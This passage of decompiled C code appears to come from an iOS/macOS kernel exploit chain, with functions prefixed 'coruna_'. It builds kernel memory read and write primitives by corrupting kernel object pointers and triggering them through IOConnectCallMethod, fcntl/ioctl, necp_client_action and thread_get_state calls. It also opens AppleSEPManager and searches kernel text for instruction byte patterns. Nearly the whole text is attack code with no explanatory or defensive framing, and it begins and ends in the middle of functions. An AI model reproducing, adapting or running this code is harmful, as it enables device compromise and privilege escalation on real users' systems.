            coruna_kernel509_via_kernel5_residual_237_4(handle);
            if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
            ___stack_chk_fail();
            }
            return;
          }
          version = 0x80000;
          if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
            version = 0x4000;
          }
          size = 0x210;
          if (*(unsigned long *)(handle + 0x158) < 0x27120000000000) {
            size = version;
          }
          if (size <= type_id) {
            type_id = size;
          }
          version = coruna_task_map_corpse_info_64(handle,u,off_3 + tag,type_id);
fail:
          coruna_kernel509_via_kernel5_residual_237_4(handle);
          if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
          ___stack_chk_fail();
          }
          return;
        } while (type_id < size);
      }
      coruna_kernel509_via_kernel5_residual_237_4(handle);
cleanup:
      if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
      ___stack_chk_fail();
      }
      return;
    }
    coruna_close(scratch);
  }
check_ok:
  if (*(long *)k_kernel_stack_chk_guard_slot != host_info) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_task_map_corpse_info_64(long handle,long addr_2,void *ctx,uint size)
{
  unsigned long u;
  long handle;
  long addr;
  long off;
  kern_return_t lk5;
  int err;
  uint size;
  long *ptr;
  size_t ls9;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  unsigned long kind;
  uint64_t type_id;
  uint64_t type_id_8;
  long base;
  long scratch [67];
  uint64_t bootargs;
  long thread_attr;
  mach_vm_size_t host_info;
  void *serial_buf [2];
  
  if (0x2711ffffffffff < *(unsigned long *)(handle + 0x158)) {
    ptr = *(long **)(&k_kernel_slot_1d50 + handle);
    if (ptr == (long *)0x0) {
      return;
    }
    if (size == 0) {
      return;
    }
    kind = 0;
    while( true ) {
      u = kind + addr_2;
      base = *ptr;
      tag = (unsigned long)*(uint *)((long)ptr + 0x1c);
      serial_buf[0] = (void *)coruna_u64_pack((serial_buf[0]), (0x84));
      version = *(unsigned long *)(handle + 0x188) & u;
      port = (unsigned long)*(uint *)(handle + 0x180) - 0x210;
      if (port <= version) {
        version = port;
      }
      handle = version + (u & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff));
      type_id_8 = *(uint64_t *)(base + tag);
      DataSynchronizationBarrier(2,3,0);
      *(long *)(base + tag) = handle + -0x10;
      lk5 = _thread_get_state(*(thread_act_t *)(ptr + 3),0x11,(thread_state_t)scratch,
                                (mach_msg_type_number_t *)serial_buf);
      if ((lk5 != 0) || ((int)serial_buf[0] != 0x84)) {
        *(uint64_t *)(tag + base) = type_id_8;
        return;
      }
      ls9 = size - kind;
      version = (handle - u) + 0x210;
      if (version <= ls9) {
        ls9 = version;
      }
      _memcpy((void *)(kind + (long)ctx),(void *)((long)scratch + (u - handle)),ls9);
      *(uint64_t *)(tag + base) = type_id_8;
      kind = ls9 + kind;
      if (size <= kind) break;
      ptr = *(long **)(&k_kernel_slot_1d50 + handle);
    }
    return;
  }
  scratch[0] = addr_2;
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    serial_buf[0] = (void *)coruna_u64_pack((serial_buf[0]), (size));
    if (*(int *)(&k_kernel_slot_1944 + handle) == -1) {
      return;
    }
    base = *(long *)(&k_kernel_slot_1958 + handle);
    err = _uuid_is_null(&k_kernel_slot_1948 + handle);
    if (err != 0) {
      return;
    }
    if (*(long *)(&k_kernel_slot_1958 + handle) == 0) {
      return;
    }
    kind = *(unsigned long *)(handle + 0x158);
    handle = 0x570;
    if (kind < 0x1f541e00000000) {
      handle = 0x370;
    }
    off = 0x578;
    if (kind < 0x1f541e00000000) {
      off = 0x378;
    }
    addr = 0x580;
    if (kind >> 0x2b < 1099) {
      addr = handle;
    }
    addr = addr + base;
    handle = 0x588;
    if (kind >> 0x2b < 1099) {
      handle = off;
    }
    err = coruna_kernel509_via_kernel509_via_kernel5_residual_237(handle,addr,serial_buf,4,0);
    base = base + handle;
    if (((err != 0) &&
        (err = coruna_kernel509_via_kernel509_via_kernel5_residual_237(handle,base,scratch,*(uint32_t *)(handle + 0x168),0),
        err != 0)) &&
       (size = _necp_client_action(*(uint32_t *)(&k_kernel_slot_1944 + handle),3,
                                    &k_kernel_slot_1948 + handle,0x10,ctx,size), size != size)
       ) {
      ___error();
      ___error();
    }
    serial_buf[0] = (void *)((unsigned long)serial_buf[0] & 0xffffffff00000000);
    coruna_kernel509_via_kernel509_via_kernel5_residual_237(handle,addr,serial_buf,4,0);
    scratch[0] = 0;
    coruna_kernel509_via_kernel509_via_kernel5_residual_237(handle,base,scratch,*(uint32_t *)(handle + 0x168),0);
    return;
  }
  host_info = 0;
  serial_buf[0] = (void *)0x0;
  bootargs = 0;
  thread_attr = 0;
  if (0x4000 < size) {
    return;
  }
  if (*(long *)(handle + 0x230) == 0) {
    return;
  }
  if (*(long *)(handle + 0x228) == 0) {
    return;
  }
  if (((*(int *)(handle + 0xe8) + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
     (*(long *)(handle + 0x100) == 0)) {
    if (((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
       ((*(int *)(&k_kernel_slot_1940 + handle) == -1 || (*(long *)(handle + 0x218) == 0))))
    if ((serial_buf[0] != (void *)0x0) && (host_info != 0)) {
    _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)serial_buf[0],
    host_info);
    }
    return;
  }
  else {
    if ((serial_buf[0] != (void *)0x0) && (host_info != 0)) {
    _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)serial_buf[0],
    host_info);
    }
    return;
  }
  err = coruna_kernel509_via_kernel509_via_kernel5_residual_237(handle,thread_attr + 8,scratch,*(uint32_t *)(handle + 0x168),0);
  if (err != 0) {
    type_id_8 = *(uint64_t *)(handle + 0x228);
    err = coruna_kernel509_via_kernel509_via_kernel5_residual_237(handle,type_id_8,&thread_attr,*(uint32_t *)(handle + 0x168),0);
    if (err != 0) {
      type_id = *(uint64_t *)(handle + 0x230);
      err = coruna_kernel509_via_mach_vm_read_overwrite_3(handle,type_id,4,(long)&bootargs + 4,0);
      if (err != 0) {
        bootargs = coruna_u64_pack((bootargs), (bootargs)) | 0x20;
        err = coruna_kernel509_via_kernel509_via_kernel5_residual_237(handle,type_id,&bootargs,4,0);
        if (err != 0) {
          err = _task_map_corpse_info_64
                            (*(uint32_t *)k_kernel_mach_task_self_slot,
                             *(uint32_t *)k_kernel_mach_task_self_slot,serial_buf,&host_info);
          if (((err == 0) && (serial_buf[0] != (void *)0x0)) && (host_info == 0x4000)) {
            _memcpy(ctx,serial_buf[0],(unsigned long)size);
          }
          coruna_kernel509_via_kernel509_via_kernel5_residual_237(handle,type_id,(long)&bootargs + 4,4,0);
        }
      }
      thread_attr = 0;
      coruna_kernel509_via_kernel509_via_kernel5_residual_237(handle,type_id_8,&thread_attr,*(uint32_t *)(handle + 0x168),0);
    }
  }
fail:
  if ((serial_buf[0] != (void *)0x0) && (host_info != 0)) {
    _mach_vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(mach_vm_address_t)serial_buf[0],
                        host_info);
  }
  return;
}
void coruna_kernel509_via_kernel5_residual_237_3(long handle,long addr_2)
{
  int err;
  uint8_t scratch[160];
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  long serial_buf;
  uint64_t thread_attr;
  long action;
  uint64_t block_ctx;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t stack_guard;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  long sa_new;
  
  sa_new = *(long *)k_kernel_stack_chk_guard_slot;
  if (((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
     (*(long *)(handle + 0x218) != 0)) {
    host_info = 0;
    thread_attr = 0;
    action = addr_2 + -0x60;
    sa_new = 0;
    sa_saved = 0;
    tmp_buf = 0;
    path_buf = 0;
    block_ctx = 0;
    sa_saved = 0;
    stack_guard = 0;
    host_info = 0;
    block_ctx = 0;
    action = 0;
    scratch = 0;
    bootargs = 0;
    bootargs = 0;
    thread_attr = k_kernel_rodata_word_43780;
    serial_buf = *(long *)(handle + 0x218) + 0x60;
    stack_guard = 2;
    serial_buf = 0x22000000;
    err = coruna_kernel5_residual_237(&k_kernel_slot_1930 + handle,&bootargs,0xa0);
    if ((err == 0) && (err = coruna_kernel5_residual_238(&k_kernel_slot_1930 + handle,scratch,0xa0), err == 0)
       ) {
      _memcmp(&bootargs,scratch,0xa0);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == sa_new) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_kernel509_via_kernel5_residual_237_4(long handle)
{
  int err;
  uint8_t scratch[160];
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  long serial_buf;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t stack_guard;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  long sa_saved;
  
  sa_saved = *(long *)k_kernel_stack_chk_guard_slot;
  if (((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
     (*(long *)(handle + 0x218) != 0)) {
    path_buf = 0;
    stack_guard = 0;
    region = 0;
    tmp_buf = 0;
    stack_guard = 0;
    sa_new = 0;
    sa_saved = 0;
    serial_buf = 0;
    action = 0;
    block_ctx = 0;
    host_info = 0;
    host_info = 0;
    thread_attr = 0;
    scratch = 0;
    bootargs = 0;
    bootargs = 0;
    thread_attr = k_kernel_rodata_word_43780;
    serial_buf = *(long *)(handle + 0x218) + 0x60;
    block_ctx = 3;
    action = 0x22000000;
    err = coruna_kernel5_residual_237(&k_kernel_slot_1930 + handle,&bootargs,0xa0);
    if ((err == 0) && (err = coruna_kernel5_residual_238(&k_kernel_slot_1930 + handle,scratch,0xa0), err == 0)
       ) {
      _memcmp(&bootargs,scratch,0xa0);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == sa_saved) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_fcntl_1bf8c(long handle,long addr_2,long off_3,uint size,int flags)
{
  unsigned long u;
  uint size;
  int err;
  long handle;
  uint version;
  uint port;
  uint32_t scratch;
  uint32_t bootargs;
  
  if ((((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) &&
      (*(int *)(&k_kernel_slot_1940 + handle) != -1)) &&
     ((*(long *)(handle + 0x218) != 0 && (handle = coruna_kernel5_residual_225(handle), handle != 0)))) {
    bootargs = 0xffffffff;
    if ((flags == 0) ||
       ((err = coruna_open_dev_null(&bootargs), err == 0 &&
        (err = coruna_kernel5_residual_236(&k_kernel_slot_1930 + handle), err == 0)))) {
      if (size != 0) {
        version = 0;
        do {
          size = size - version;
          scratch = 0;
          handle = addr_2 + (unsigned long)version;
          if (size < 4) {
            port = 0;
            if ((((handle + (unsigned long)size) - 1 ^ handle + 3U) &
                (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff)) != 0) {
              port = 4 - size;
            }
          }
          else {
            port = 0;
          }
          u = 4 - (unsigned long)port;
          if ((unsigned long)size <= 4 - (unsigned long)port) {
            u = (unsigned long)size;
          }
          if (((u < 4) &&
              (err = coruna_fcntl_26e9c(handle,handle - (unsigned long)port,&scratch,4,0), err != 0)) ||
             (err = coruna_kernel509_via_kernel5_residual_237_3(handle,handle - (unsigned long)port), err != 0)) {
fail:
            coruna_kernel509_via_kernel5_residual_237_4(handle);
            goto done;
          }
          _memcpy((void *)((long)&scratch + (unsigned long)port),(void *)(off_3 + (unsigned long)version),u);
          if (*(long *)(handle + 0x220) == 0) {
            err = _fcntl(*(int *)(&k_kernel_slot_1940 + handle),6);
          }
          else {
            err = _ioctl(*(int *)(&k_kernel_slot_1940 + handle),0x8004667c);
          }
          if (err != 0) {
            ___error();
            ___error();
            goto fail;
          }
          version = (version - port) + 4;
        } while (version < size);
      }
      coruna_kernel509_via_kernel5_residual_237_4(handle);
done:
      if (flags == 0) {
        return;
      }
    }
    coruna_close(bootargs);
  }
  return;
}
void coruna_semaphore_destroy(long handle,int flags)
{
  pthread_t p_Var1;
  long *ptr;
  
  ptr = *(long **)(handle + 0x28);
  if (ptr != (long *)0x0) {
    *(uint8_t *)(handle + 0xc) = 0;
    *(uint64_t *)(handle + 0x28) = 0;
    p_Var1 = (pthread_t)*ptr;
    if (p_Var1 != (pthread_t)0x0) {
      if (1 < *(semaphore_t *)(ptr + 1) + 1 && flags != 0) {
        *(uint8_t *)(ptr + 7) = 1;
        _semaphore_signal(*(semaphore_t *)(ptr + 1));
        p_Var1 = (pthread_t)*ptr;
      }
      _pthread_join(p_Var1,(void **)0x0);
      *ptr = 0;
    }
    if (1 < *(semaphore_t *)(ptr + 1) + 1) {
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,*(semaphore_t *)(ptr + 1));
      *(uint32_t *)(ptr + 1) = 0;
    }
    if (1 < *(semaphore_t *)((long)ptr + 0xc) + 1) {
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,
                         *(semaphore_t *)((long)ptr + 0xc));
      *(uint32_t *)((long)ptr + 0xc) = 0;
    }
    if ((int)ptr[2] != -1) {
      _close((int)ptr[2]);
      *(uint32_t *)(ptr + 2) = 0xffffffff;
    }
    ptr[5] = 0;
    ptr[4] = 0;
    ptr[7] = 0;
    ptr[6] = 0;
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    _free(ptr);
  }
  return;
}
void coruna_open_sepmgr(long handle)
{
  uint8_t *ptr;
  kern_return_t lk2;
  int err;
  uint64_t *buf;
  unsigned long u;
  bool err;
  uint64_t scratch;
  semaphore_t bootargs [2];
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
    if (*(char *)(handle + 0xc) == '\0') {
      u = (unsigned long)*(uint *)(handle + 0x10);
      if (*(uint *)(handle + 0x10) + 1 < 2) {
        u = coruna_ioservicegetmatchingservice_1a3ec("AppleSEPManager");
        if ((int)u + 1U < 2) {
          return;
        }
        *(int *)(handle + 0x10) = (int)u;
      }
      ptr = k_kernel_mach_task_self_slot;
      err = false;
      do {
        err = __IOServiceSetAuthorizationID(u,0);
        if (err != -0x1ffffd3f) {
          if (err != 0) {
            return;
          }
          *(uint8_t *)(handle + 0xc) = 1;
          return;
        }
        if (err) {
          return;
        }
        err = coruna_kernel509_via_plist_dict(handle,*(uint32_t *)ptr);
        err = true;
      } while (err != 0);
    }
  }
  else {
    scratch = 0;
    bootargs[0] = 0;
    bootargs[1] = 0;
    if ((*(char *)(handle + 0xc) == '\0') &&
       (buf = _calloc(1,0x40), buf != (uint64_t *)0x0)) {
      *(uint32_t *)(buf + 2) = 0xffffffff;
      *(uint64_t **)(handle + 0x28) = buf;
      ptr = k_kernel_mach_task_self_slot;
      lk2 = _semaphore_create(*(task_t *)k_kernel_mach_task_self_slot,bootargs + 1,0,0);
      if (lk2 == 0) {
        *(semaphore_t *)(buf + 1) = bootargs[1];
        lk2 = _semaphore_create(*(task_t *)ptr,bootargs,0,0);
        if (lk2 == 0) {
          *(semaphore_t *)((long)buf + 0xc) = bootargs[0];
          err = coruna_pthread_attr_setdetachstate_2c464(handle,&scratch,coruna_mach_port_deallocate_1e398,handle);
          if (err == 0) {
            *buf = scratch;
            lk2 = _semaphore_timedwait(bootargs[0],(mach_timespec_t)0x3);
            if ((*(int *)((long)buf + 0x3c) == 0) && (lk2 == 0)) {
fail:
              *(uint8_t *)(handle + 0xc) = 1;
              return;
            }
          }
        }
      }
      coruna_semaphore_destroy(handle,0);
    }
  }
  return;
}
void coruna_ioconnectcallmethod_27ef0(long handle,long addr_2,long off_3,uint size,int flags)
{
  unsigned long u;
  long *ptr;
  long handle;
  int err;
  uint size;
  uint version;
  long addr;
  unsigned long port;
  unsigned long tag;
  uint kind;
  uint64_t type_id;
  uint type_id_8;
  size_t ls13;
  long off;
  uint32_t scratch;
  uint32_t bootargs;
  uint64_t thread_attr;
  uint32_t host_info;
  uint32_t scratch;
  uint64_t serial_buf;
  uint64_t bootargs;
  unsigned long action [3];
  
  action[2] = *(unsigned long *)k_kernel_stack_chk_guard_slot;
  if (((((1 < *(int *)(handle + 0xe8) + 1U) && (*(long *)(handle + 0xf8) != 0)) &&
       (*(long *)(handle + 0x100) != 0)) && (addr = coruna_kernel5_residual_225(handle), addr != 0)) &&
     ((bootargs = 0xffffffff, flags == 0 || (err = coruna_open_dev_null(&bootargs), err == 0)))) {
    if (size != 0) {
      tag = 0;
      do {
        u = addr_2 + tag;
        type_id_8 = size - (int)tag;
        ls13 = (size_t)type_id_8;
        if (((*(unsigned long *)(handle + 0x188) & u) == 0) && (0x3fff < type_id_8)) {
          port = coruna_uuid_is_null(handle);
          if ((port & 1) == 0) {
fail:
            kind = 0;
            goto done;
          }
          kind = 0x80000;
          if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
            kind = 0x4000;
          }
          size = 0x210;
          if (*(unsigned long *)(handle + 0x158) < 0x27120000000000) {
            size = kind;
          }
          if (size <= type_id_8) {
            type_id_8 = size;
          }
          size = coruna_task_map_corpse_info_64(handle,u,off_3 + tag,type_id_8);
        }
        else {
          if (3 < type_id_8) goto fail;
          kind = 0;
          if ((((u + ls13) - 1 ^ u + 3) &
              (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff)) != 0) {
            kind = 4 - type_id_8;
          }
done:
          err = *(int *)(handle + 0xe8);
          size = 0xad001;
          if (1 < err + 1U) {
            addr = *(long *)(handle + 0xf8);
            size = 0xad001;
            if (*(int *)(handle + 0x140) < 0x2258) {
              if ((addr != 0) && (size = 0xad001, *(long *)(handle + 0x100) != 0)) {
                addr = *(long *)(handle + 0x108) + addr;
                type_id = *(uint64_t *)(addr + 0xc0);
                *(unsigned long *)(addr + 0xc0) = (u - kind) + -0x14;
                serial_buf = 0;
                thread_attr = coruna_u64_pack((thread_attr), (1));
                action[0] = (unsigned long)*(uint *)(handle + 0x110);
                version = _IOConnectCallMethod(err,0x10,action,1,0,0,&serial_buf,&thread_attr,0,0);
                if (version == 0) {
                  version = 0;
                  scratch = (uint32_t)serial_buf;
                }
                else {
                  version = version | 0x80000000;
                }
                size = 0xad001;
                if ((*(long *)(handle + 0xf8) != 0) &&
                   (size = 0xad001, *(long *)(handle + 0x100) != 0)) {
                  size = 0;
                  *(uint64_t *)(*(long *)(handle + 0x108) + *(long *)(handle + 0xf8) + 0xc0) =
                       type_id;
                }
                goto cleanup;
              }
            }
            else if ((addr != 0) && (size = 0xad001, *(long *)(handle + 0x100) != 0)) {
              off = 0x450;
              if (*(unsigned long *)(handle + 0x158) < 0x225c192d100000) {
                off = 0x448;
              }
              ptr = (long *)(*(long *)(handle + 0x108) + addr + off);
              off = ptr[1];
              addr = *ptr;
              *ptr = u - kind;
              ptr[1] = 4;
              host_info = 0;
              scratch = 2;
              thread_attr = 4;
              action[0] = (unsigned long)*(uint *)(handle + 0x110);
              action[1] = 0;
              serial_buf = 0;
              bootargs = 0;
              version = _IOConnectCallMethod
                                (err,0x33,action,2,0,0,&serial_buf,&scratch,&host_info,&thread_attr)
              ;
              if (version == 0) {
                version = 0;
                scratch = host_info;
              }
              else {
                version = version | 0x80000000;
              }
              size = 0xad001;
              if ((*(long *)(handle + 0xf8) != 0) &&
                 (size = 0xad001, *(long *)(handle + 0x100) != 0)) {
                size = 0;
                handle = 0x450;
                if (*(unsigned long *)(handle + 0x158) < 0x225c192d100000) {
                  handle = 0x448;
                }
                ptr = (long *)(*(long *)(handle + 0x108) + *(long *)(handle + 0xf8) + handle);
                ptr[1] = off;
                *ptr = addr;
              }
cleanup:
              if (version != 0) {
                size = version;
              }
              if (size == 0) {
                if (3 < type_id_8) {
                  ls13 = 4;
                }
                _memcpy((void *)(off_3 + tag),(void *)((long)&scratch + (unsigned long)kind),ls13);
              }
            }
          }
          type_id_8 = 4;
        }
      } while ((size == 0) &&
              (type_id_8 = type_id_8 + (int)tag, tag = (unsigned long)type_id_8, type_id_8 < size));
    }
    if (flags != 0) {
      coruna_close(bootargs);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != action[2]) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_ioconnectcallmethod_1c8a8(long handle,long addr_2,long off_3,uint size,int flags)
{
  long handle;
  unsigned long u;
  long addr;
  uint size;
  int err;
  long off;
  uint64_t version;
  uint port;
  uint tag;
  uint64_t scratch;
  uint32_t bootargs;
  unsigned long thread_attr [3];
  long host_info;
  
  host_info = *(long *)k_kernel_stack_chk_guard_slot;
  if (((((1 < *(int *)(handle + 0xe8) + 1U) && (*(long *)(handle + 0xf8) != 0)) &&
       (*(long *)(handle + 0x100) != 0)) && (off = coruna_kernel5_residual_225(handle), off != 0)) &&
     ((bootargs = 0xffffffff, flags == 0 || (err = coruna_open_dev_null(&bootargs), err == 0)))) {
    if (size != 0) {
      port = 0;
      while( true ) {
        size = size - port;
        scratch = 0;
        off = addr_2 + (unsigned long)port;
        if (size < 8) {
          tag = 0;
          if ((((off + (unsigned long)size) - 1 ^ off + 7U) &
              (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff)) != 0) {
            tag = 8 - size;
          }
        }
        else {
          tag = 0;
        }
        u = 8 - (unsigned long)tag;
        if ((unsigned long)size <= 8 - (unsigned long)tag) {
          u = (unsigned long)size;
        }
        if ((u < 8) &&
           (err = coruna_ioconnectcallmethod_27ef0(handle,off - (unsigned long)tag,&scratch,8,0), err != 0)) break;
        _memcpy((void *)((long)&scratch + (unsigned long)tag),(void *)(off_3 + (unsigned long)port),u);
        err = *(int *)(handle + 0xe8);
        if ((err + 1U < 2) ||
           ((*(long *)(handle + 0xf8) == 0 || (*(long *)(handle + 0x100) == 0)))) break;
        handle = *(long *)(handle + 0x108) + *(long *)(handle + 0xf8);
        addr = 0x368;
        if (*(int *)(handle + 0x140) < 0x2258) {
          addr = 0x360;
        }
        version = *(uint64_t *)(handle + addr);
        *(unsigned long *)(handle + addr) = off - (unsigned long)tag;
        thread_attr[0] = (unsigned long)*(uint *)(handle + 0x110);
        thread_attr[1] = 0;
        thread_attr[2] = scratch;
        err = _IOConnectCallMethod(err,0x21,thread_attr,3,0,0,0,0,0,0);
        if ((*(long *)(handle + 0xf8) == 0) || (*(long *)(handle + 0x100) == 0)) break;
        off = 0x368;
        if (*(int *)(handle + 0x140) < 0x2258) {
          off = 0x360;
        }
        *(uint64_t *)(*(long *)(handle + 0x108) + *(long *)(handle + 0xf8) + off) = version;
        if ((err != 0) || (port = (port - tag) + 8, size <= port)) break;
      }
    }
    if (flags != 0) {
      coruna_close(bootargs);
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == host_info) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_vm_map_28574(long handle,vm_address_t *arg,vm_size_t arg_x,unsigned long arg_x_x)
{
  vm_inherit_t unaff_w29;
  
  _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,arg,arg_x,0,1,
          *(mem_entry_name_port_t *)(handle + 0x58),
          arg_x_x & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),0,3,2,unaff_w29);
  return;
}
void coruna_mach_port_deallocate_1cb2c(long handle)
{
  vm_address_t address;
  
  if (1 < *(int *)(handle + 0x5c) + 1U) {
    _IOObjectRelease();
    *(uint32_t *)(handle + 0x5c) = 0;
  }
  address = *(vm_address_t *)(handle + 0x60);
  if ((address != 0) && (*(vm_size_t *)(handle + 0x68) != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,*(vm_size_t *)(handle + 0x68)
                  );
    *(vm_address_t *)(handle + 0x60) = 0;
    *(uint64_t *)(handle + 0x68) = 0;
  }
  *(uint64_t *)(handle + 0x70) = 0;
  *(uint64_t *)(handle + 0x78) = 0;
  if (1 < *(mach_port_name_t *)(handle + 0x58) + 1) {
    _mach_port_deallocate
              (*(ipc_space_t *)k_kernel_mach_task_self_slot,*(mach_port_name_t *)(handle + 0x58));
    *(uint32_t *)(handle + 0x58) = 0;
  }
  return;
}
void coruna_macho_data_seg(long handle,unsigned long arg)
{
  uint u;
  int err;
  long handle;
  long addr;
  long off;
  long base;
  unsigned long size;
  int scratch;
  uint32_t scratch;
  long bootargs;
  long thread_attr;
  uint64_t host_info;
  long serial_buf;
  long action;
  long block_ctx;
  
  if (*(long *)(handle + 0x80) == 0 || *(int *)(handle + 0x88) == 0) {
    if ((arg & 1) == 0) {
      coruna_macho_text_sect(&serial_buf,*(uint64_t *)(&k_kernel_slot_19f8 + handle));
      thread_attr = action + block_ctx + -0x20000;
      block_ctx = 0x20000;
      bootargs = serial_buf;
      host_info = 0x20000;
      action = thread_attr;
      handle = coruna_strsep(&bootargs,"88 91 00 B9 9F 0D 00 B9",0,1);
      if (handle != 0) {
        size = 0xfffffffffffffffc;
        base = 0;
        do {
          off = handle + size + 4;
          u = coruna_kernel509_via_kernel5_residual_226(*(uint64_t *)(&k_kernel_slot_19f8 + handle),off);
          addr = base;
          if (((u & 0x9f000000) == 0x90000000) &&
             (u = coruna_kernel509_via_kernel5_residual_226(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + size + 8),
             (u & 0xbfc00000) == 0xb9400000)) {
            addr = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),off);
            if (addr == 0) {
              return;
            }
            if (base != 0) {
              err = coruna_kernel509_residual_307(handle,base,&bootargs);
              if (err == 0) {
                return;
              }
              handle = coruna_fn_ptr_cast_2(handle,bootargs);
              if (handle == 0) {
                return;
              }
              err = coruna_kernel509_residual_307(handle,addr,&scratch);
              if (err == 0) {
                return;
              }
              handle = coruna_fn_ptr_cast_2(handle,coruna_u64_pack((scratch), (scratch)));
              if (handle == 0) {
                return;
              }
              handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_6(handle,bootargs);
              if (handle == 0) {
                return;
              }
              arg = arg & 0xffffffff;
              *(long *)(handle + 0x80) = handle;
              *(int *)(handle + 0x88) = scratch - (int)bootargs;
              goto fail;
            }
          }
          size = size + 4;
          base = addr;
        } while (size < 0xfc);
      }
    }
  }
  else {
fail:
    if (((((*(long *)(handle + 0xa0) == 0 || *(int *)(handle + 0xa8) == 0) && ((arg & 1) == 0)
          ) && (coruna_macho_map_segsect(&serial_buf,*(uint64_t *)(&k_kernel_slot_19f8 + handle),"__DATA","__percpu")
               , base = block_ctx, handle = action, action != 0)) &&
        ((block_ctx != 0 &&
         (coruna_macho_text_sect(&serial_buf,*(uint64_t *)(&k_kernel_slot_19f8 + handle)), action != 0)))) &&
       (block_ctx != 0)) {
      action = action + block_ctx + -0x20000;
      block_ctx = 0x20000;
      off = coruna_strsep(&serial_buf,".. 02 00 F9 E1 03 13 AA",0,1);
      if (((off != 0) &&
          (off = coruna_kernel509_via_kernel509_via_kernel5_residual_226_3(*(uint64_t *)(&k_kernel_slot_19f8 + handle),off + -8,0), off != 0))
         && (err = coruna_kernel509_via_mach_vm_read_overwrite_2(handle,off,&bootargs), err != 0)) {
        handle = bootargs + handle;
        off = coruna_fn_ptr_cast_2(handle,handle);
        if ((off != 0) && (handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_6(handle,handle), handle != 0)) {
          *(long *)(handle + 0xa0) = handle;
          *(uint *)(handle + 0xa8) =
               *(uint *)(handle + 0x188) + (int)base & (*(uint *)(handle + 0x188) ^ 0xffffffff);
        }
      }
    }
  }
  return;
}
void coruna_pthread_mach_thread_np_289c8(byte *arg,unsigned long arg_x)
{
  pthread_mutex_t *ptr;
  int err;
  ushort u;
  uint size;
  uint8_t *ptr;
  bool err;
  int status;
  kern_return_t lk8;
  mach_port_t lm9;
  uint version;
  uint port;
  uint tag;
  mach_port_t lm13;
  uint kind;
  void **lppv15;
  long handle;
  unsigned long type_id;
  uint64_t type_id_8;
  uint64_t type_id_9;
  void *ptr;
  vm_address_t address;
  unsigned long type_id_10;
  long addr;
  pthread_t p_Var23;
  vm_size_t size;
  uint64_t *buf;
  void *buf;
  uint32_t type_id_11;
  unsigned long scratch;
  vm_address_t bootargs;
  pthread_t thread_attr;
  semaphore_t host_info;
  
  bootargs = 0;
  size = *(vm_size_t *)k_kernel_vm_page_size_slot;
  status = *(int *)(arg + 0x140);
  if (status < 0x2258) {
    if (1 < status - 0x1f53U && status != 0x1c1b) {
      return;
    }
  }
  else if ((status != 0x2258 && status != 0x2712) && status != 0x225c) {
    return;
  }
  status = coruna_fn_ptr_cast_10(arg,0x4000000);
  if (status == 0) {
    status = coruna_fn_ptr_cast_10(arg,0x5584001);
    tag = 0xb8;
    if (status == 0) {
      status = coruna_fn_ptr_cast_10(arg,0x200);
      tag = 0x100;
      if (status != 0) {
        tag = 0xb8;
      }
    }
  }
  else {
    tag = 0x108;
  }
  ptr = k_kernel_mach_task_self_slot;
  if ((*(long *)(arg + 0x30) == 0) || ((arg_x & 1) != 0)) {
    status = coruna_macho_data_seg(arg,arg_x);
    if ((bootargs != 0) && (size != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,bootargs,size);
    }
    return;
  }
  else {
    thread_attr = (pthread_t)0x0;
